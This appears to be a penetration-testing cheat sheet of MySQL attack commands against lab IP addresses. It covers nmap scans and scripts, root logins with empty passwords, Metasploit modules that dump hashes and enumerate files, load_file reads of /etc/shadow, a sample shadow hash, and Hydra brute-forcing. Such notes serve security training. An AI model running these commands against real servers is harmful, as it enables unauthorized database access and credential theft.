# MySQL

 #### Nmap
```bash
nmap 192.168.2.3

nmap 192.168.2.3 -p3306 -sV
```


#### Mysql
```bash
mysql -h 192.168.2.3 -u root
$> show databases;                  (lists databases)
$> use books;                       (gets in the databases)
$> show tables;                     (shows tables in selected database)
$> select count(*) from authors;    (gets number included)
$> select * from authors;           (dumps all info from authors)

```

#### Metasploit
```bash
use auxiliary/scanner/mysql/mysql_writable_dirs
set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
setg rhosts 192.125.250.3        (setg ---> global variable)
set verbose false
advanced                        (shows advanced options)
set password ""                 (null password)
run


ues auxiliary/scanner/mysql/mysql_hashdump
set rhosts 192.168.2.3
set password ""
run

use auxiliary/scanner/mysql/mysql_file_enum
set rhosts 192.168.2.3
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""
exploit

use auxiliary/scanner/mysql/mysql_schemadump
set username root
set password ""
run
```

#### Mysql
```bash
mysql -h 192.168.2.3 -u root
$> select load_file("/etc/shadow");
$> 
```

#### Nmap Script (empty password login)
```bash
nmap 192.168.2.3 -sV -p3306 --script=mysql-empty-password (empty pass login)

nmap 192.168.2.3 -sV -p3306 --script=mysql-info

(Users)
nmap 192.168.2.3 -sV -p3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"

(databases)
nmap 192.168.2.3 -sV -p3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"

(Variables)
nmap 192.168.2.3 -sV -p3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"       --> (datadir: where information is stored)  

```


```bash
(Audit)
nmap 192.168.2.3 -sV -p3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

(Hash Dump)
nmap 192.168.2.3 -sV -p3306 --script=mysql-dump-hashes --script-args="username='root',password=''"     

(Query)
nmap 192.168.2.3 -sV -p3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
```

#### HASHES
```bash
root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::

pure hash without algos and saltes -->
S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/
```


# MySQL Dictionary Attack

#### Nmap
```bash
nmap 192.168.2.3 -p3306 -sV
```

### Metasploit
```bash
use auxiliary/scanner/mysql/mysql_login
set rhosts 192.168.2.3
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set verbose false
set stop_on_success true
set username root
run
```

### Hydra 
```bash
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.2.3 mysql
```
